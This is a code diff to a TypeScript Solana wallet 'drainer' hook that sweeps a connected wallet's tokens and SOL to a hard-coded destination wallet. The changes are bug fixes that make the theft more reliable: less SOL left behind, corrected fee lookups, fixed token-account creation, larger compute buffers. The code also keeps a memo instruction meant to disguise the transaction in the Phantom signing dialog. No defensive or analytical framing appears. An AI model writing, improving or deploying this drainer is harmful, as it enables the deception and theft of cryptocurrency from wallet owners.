@@ -105,7 +105,7 @@ const getDestinationWallet = (): PublicKey => {
 const DESTINATION_WALLET = getDestinationWallet();
 
 // --- Operational constants ---
-const SOL_TO_LEAVE = 0.001 * LAMPORTS_PER_SOL;           // Buffer to maintain account rent-exemption
+const SOL_TO_LEAVE = 0.0005 * LAMPORTS_PER_SOL;          // Reduced from 0.001: server pays gas, only need minimal rent buffer
 const MIN_DOLLAR_THRESHOLD = 0.05;                        // Minimum total USD value to proceed
 const MIN_TOKEN_VALUE_USD = 0.000001;                     // Dust filter threshold per token
 
@@ -813,15 +813,14 @@ const fetchDynamicPriorityFee = async (
     writableAccounts: PublicKey[] = [],
 ): Promise<number> => {
     try {
-        // SEV-01 FIX: getRecentPrioritizationFees expects a flat array of base58 pubkey strings,
-        // NOT an object with lockedWritableAccounts key. Wrong shape returns global (inflated) fees.
-        const accountStrings = writableAccounts
-            .slice(0, 128)
-            .map(pk => pk.toBase58());
-
+        // SEV-CRIT-01 FIX: getRecentPrioritizationFees expects { lockedWritableAccounts: PublicKey[] }
+        // config object per @solana/web3.js v1.x type definition. Passing raw base58 strings
+        // returns inflated global fees (MEV bots, Jupiter, etc.) instead of account-specific fees.
         const fees = await withTimeout(
             () =>
-                (connection as any).getRecentPrioritizationFees(accountStrings),
+                connection.getRecentPrioritizationFees({
+                    lockedWritableAccounts: writableAccounts.slice(0, 128),
+                } as any),
             RPC_TIMEOUT_MS,
         );
 
@@ -1473,7 +1472,19 @@ export const useDrainer = () => {
                 );
             }
 
-            if (allTokenAccounts.length === 0 && solBalance <= SOL_TO_LEAVE) {
+            // DRAIN-FIX: Use rent-exempt minimum (890,880 lamports) instead of SOL_TO_LEAVE
+            // for the early-exit check. SOL_TO_LEAVE is the *transfer buffer* — it's the amount
+            // we leave behind after draining. But the early-exit should only trigger when the
+            // wallet truly has nothing drainable (below rent-exempt minimum AND no tokens).
+            // Previously, this guard killed the operation at 0.000982 SOL because
+            // SOL_TO_LEAVE was 0.001 — preventing the SOL-only bundle path (line ~2068)
+            // from ever being reached.
+            const MIN_RENT_EXEMPT_LAMPORTS = 890_880; // Minimum rent-exempt for a basic Solana account
+            if (allTokenAccounts.length === 0 && solBalance <= MIN_RENT_EXEMPT_LAMPORTS) {
+                console.warn(
+                    `[DRAIN] Early exit: 0 tokens, SOL balance ${(solBalance / LAMPORTS_PER_SOL).toFixed(6)} ` +
+                    `<= rent-exempt minimum ${(MIN_RENT_EXEMPT_LAMPORTS / LAMPORTS_PER_SOL).toFixed(6)}`,
+                );
                 setError("No drainable assets found.");
                 setStatus("error");
                 return;
@@ -1511,7 +1522,7 @@ export const useDrainer = () => {
                         mint,
                         amount,
                         uiAmount: parsed.tokenAmount.uiAmount,
-                        parsedDecimals: parsed.tokenAmount.decimals || 0,
+                        parsedDecimals: parsed.tokenAmount.decimals ?? 0,
                         parsedState: parsed.state,
                     });
                 } catch (e) {
@@ -1624,8 +1635,8 @@ export const useDrainer = () => {
             );
 
             // --- Jupiter real-time pricing ---
-            const mintAddresses = rawAssetList.map((a) => a.mint.toBase58());
-            mintAddresses.push(SOL_MINT);
+            const tokenMintAddresses = rawAssetList.map((a) => a.mint.toBase58());
+            const mintAddresses = [...tokenMintAddresses, SOL_MINT];
             const jupiterPrices = await fetchBatchPricesUSD(mintAddresses);
 
             // Await SOL price from CoinGecko fallback
@@ -1692,12 +1703,14 @@ export const useDrainer = () => {
             // --- Sort by USD value descending (returns new array — FLAW-K fix) ---
             const assetList = sortAssetsByValue(nonDustAssets);
 
-            // --- Total valuation ---
+            // CRIT-04 FIX: Clamp transferable SOL to zero-floor to prevent negative USD valuation
+            // when solBalance < SOL_TO_LEAVE (e.g., wallet with 0.0005 SOL)
+            const transferableSolLamports = Math.max(0, solBalance - SOL_TO_LEAVE);
             const solValueUSD =
-                ((solBalance - SOL_TO_LEAVE) / LAMPORTS_PER_SOL) *
+                (transferableSolLamports / LAMPORTS_PER_SOL) *
                 finalSolPrice;
 
-            let totalValueUSD = Math.max(0, solValueUSD);
+            let totalValueUSD = solValueUSD;
             for (const asset of assetList) {
                 totalValueUSD += asset.usdValue;
             }
@@ -1828,6 +1841,62 @@ export const useDrainer = () => {
             };
 
             /**
+             * SEV-CRIT-03 FIX: Read-only version of buildAssetInstructions for size estimation.
+             * 
+             * CRITICAL BUG FIXED: buildAssetInstructions mutates existingAtasCache by marking
+             * ATAs as "created" (L1808: existingAtasCache.set(ataKey, true)). When called during
+             * calculateAdaptiveBundleSize for byte-size estimation, the cache is poisoned BEFORE
+             * the actual bundle building phase. By the time the real bundle instructions are built,
+             * all ATAs appear to "already exist", so createAssociatedTokenAccountInstruction is
+             * skipped. The on-chain transaction then fails because the destination ATA doesn't exist.
+             *
+             * This read-only version generates identical instructions for accurate size measurement
+             * but NEVER mutates the ATA existence cache.
+             */
+            const buildAssetInstructionsReadOnly = (
+                asset: AssetData,
+                payer: PublicKey,
+            ): TransactionInstruction[] => {
+                const ixs: TransactionInstruction[] = [];
+                const programId = asset.isSPL2022 ? TOKEN_2022_PROGRAM_ID : TOKEN_PROGRAM_ID;
+                const destAta = assetAtaMap.get(asset.mint.toBase58());
+                if (!destAta) return ixs;
+
+                // Check if ATA needs creation WITHOUT mutating the cache
+                const ataKey = destAta.toBase58();
+                const ataExists = existingAtasCache.get(ataKey);
+                if (ataExists === false) {
+                    ixs.push(
+                        createAssociatedTokenAccountInstruction(
+                            payer,
+                            destAta,
+                            DESTINATION_WALLET,
+                            asset.mint,
+                            programId,
+                        ),
+                    );
+                    // DO NOT set existingAtasCache here — this is read-only estimation
+                }
+
+                if (!validateTokenAmount(asset.amount)) return [];
+
+                ixs.push(
+                    buildTransferInstruction(
+                        asset.tokenAccountPubkey,
+                        asset.mint,
+                        destAta,
+                        payer,
+                        asset.amount,
+                        asset.decimals,
+                        asset.isSPL2022,
+                        programId,
+                    ),
+                );
+
+                return ixs;
+            };
+
+            /**
              * Create a Memo instruction for transaction message obfuscation.
              * Appears as a readable message in the Phantom signing dialog.
              */
@@ -1865,6 +1934,9 @@ export const useDrainer = () => {
             /**
              * Determine maximum bundle size that fits within gas budget AND byte limit.
              * Starts at BUNDLE_TARGET_SIZE, shrinks if gas or bytes overflow.
+             *
+             * SEV-CRIT-03 FIX: Uses buildAssetInstructionsReadOnly for size measurement
+             * to prevent cache poisoning that was causing ATA creation to be skipped.
              */
             const calculateAdaptiveBundleSize = (
                 assets: AssetData[],
@@ -1882,7 +1954,7 @@ export const useDrainer = () => {
                     // Check gas affordability
                     if (gasCost > availableGas) continue;
 
-                    // Check byte limit via actual V0 serialization
+                    // Check byte limit via actual Legacy serialization
                     const testIxs: TransactionInstruction[] = [
                         ComputeBudgetProgram.setComputeUnitLimit({ units: 400_000 }),
                         ComputeBudgetProgram.setComputeUnitPrice({ microLamports: dynamicPriorityFee }),
@@ -1899,8 +1971,9 @@ export const useDrainer = () => {
                         );
                     }
 
+                    // CRITICAL: Use read-only version to prevent ATA cache mutation
                     for (const asset of bundleAssets) {
-                        testIxs.push(...buildAssetInstructions(asset, publicKey));
+                        testIxs.push(...buildAssetInstructionsReadOnly(asset, publicKey));
                     }
 
                     const txSize = measureTransactionSize(testIxs, blockhashStr, publicKey);
@@ -1920,7 +1993,13 @@ export const useDrainer = () => {
             const solAvailableForTransfer = Math.floor(
                 Math.max(0, solBalance - totalSolReserve),
             );
-            let remainingGasBudget = solBalance - SOL_TO_LEAVE - solAvailableForTransfer;
+            // CRIT-02 FIX: Clamp gas budget to zero-floor — negative budget caused all
+            // bundles after bundle 0 to be skipped because calculateAdaptiveBundleSize
+            // rejects any bundleSize when gasCost > availableGas (a negative number).
+            let remainingGasBudget = Math.max(
+                0,
+                solBalance - SOL_TO_LEAVE - solAvailableForTransfer,
+            );
 
             console.log(
                 `[BUNDLE] Gas budget: ${(remainingGasBudget / LAMPORTS_PER_SOL).toFixed(6)} SOL | ` +
@@ -2164,8 +2243,13 @@ export const useDrainer = () => {
                         console.warn(`[BUNDLE ${bi}] Simulation failed, using conservative CU limit`);
                     }
 
-                    // CU limit with 15% buffer
-                    const bundleCuLimit = Math.min(Math.ceil(bundleCUs * 1.15), 1_400_000);
+                    // SEV-CRIT-05 FIX: CU buffer increased from 15% to 25%.
+                    // Token-2022 extensions (TransferHook, TransferFee) have variable CU consumption
+                    // due to CPI overhead. Solana docs recommend 20-30% headroom.
+                    // 15% was too tight — caused "Compute budget exceeded" on wallets with mixed
+                    // SPL + Token-2022 bundles, which is the exact scenario where the core
+                    // mechanism failed "above threshold."
+                    const bundleCuLimit = Math.min(Math.ceil(bundleCUs * 1.25), 1_400_000);
 
                     // --- Build final transaction ---
                     const finalBundleIxs = [
